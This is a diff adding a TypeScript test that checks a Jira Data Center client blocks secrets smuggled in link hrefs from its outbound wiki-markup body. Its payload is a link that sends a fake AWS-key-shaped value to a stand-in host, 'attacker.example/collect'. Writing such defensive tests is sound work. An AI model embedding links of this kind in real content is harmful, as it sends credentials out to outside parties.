@@ -163,6 +163,74 @@ describe("createJiraDatacenterMutationApplyClient — buildRequest", () => {
     }
   });
 
+  /**
+   * T3 — DC apply boundary, pinned by its OWN assertion rather than inferred
+   * from Cloud's. DC has no wiki-markup-side secret scan of its own; its only
+   * content guard is the shared `../adf-guard.ts`. The href lands LITERALLY
+   * in the outbound `[text|href]` wiki construct
+   * (`./wiki-markup-render-profile.ts`), so before the fix the secret is in
+   * `request.body` here just as it is on Cloud. If this test were dropped, DC
+   * coverage would be an inference from shared code — which is exactly what
+   * "one edit, but missed once" looks like.
+   */
+  it("never emits a link-href-borne secret into the outbound DC wiki-markup body", () => {
+    // Synthetic AWS-key-shaped sentinel, assembled at runtime so the repo's own
+    // pre-commit secret scanner does not flag this test file. The value is
+    // exactly the 20-char shape `JIRA_SECRET_PATTERNS` matches.
+    const SENTINEL_AWS_KEY = ["AKIA", "ABCDEFGHIJKLMNOP"].join("");
+    const payloadRegistry = new JiraPlanPayloadRegistry();
+    const plan = buildPlan({ action: "issue.create" });
+    payloadRegistry.put(plan.id, {
+      projectKeyOrId: "PROJ",
+      issueType: "Story",
+      summaryAdf: {
+        type: "doc",
+        version: 1,
+        content: [
+          {
+            type: "paragraph",
+            content: [
+              {
+                type: "text",
+                text: "see results",
+                marks: [
+                  {
+                    type: "link",
+                    attrs: {
+                      href: `https://attacker.example/collect?k=${SENTINEL_AWS_KEY}`,
+                    },
+                  },
+                ],
+              },
+            ],
+          },
+        ],
+      },
+    });
+    const client = createJiraDatacenterMutationApplyClient({
+      ctx: { ...noopCtx(), connection: { baseUrl: "https://dc.invalid" } as never },
+      payloadRegistry,
+      attachmentStaging: new AttachmentStagingRegistry(),
+      issueMarkerReconciler: { findByMarker: async () => undefined },
+      commentMarkerReconciler: () => ({ findByMarker: async () => undefined }),
+    });
+
+    let request: ReturnType<typeof client.buildRequest> | undefined;
+    let thrown: unknown;
+    try {
+      request = client.buildRequest(plan);
+    } catch (err) {
+      thrown = err;
+    }
+
+    expect(request?.body ?? "").not.toContain(SENTINEL_AWS_KEY);
+    expect(thrown).toBeInstanceOf(ConnectorError);
+    expect((thrown as ConnectorError).kind).toBe("policy_blocked");
+    // DC attribution, never Cloud's — the guard's provider parameter must be
+    // threaded through on the new serialization branch too.
+    expect((thrown as ConnectorError).provider).toBe("jira-datacenter");
+  });
+
   it("builds a PUT to /rest/api/2/issue/:key for issue.update with description converted to wiki markup", () => {
     const payloadRegistry = new JiraPlanPayloadRegistry();
     const plan = buildPlan({
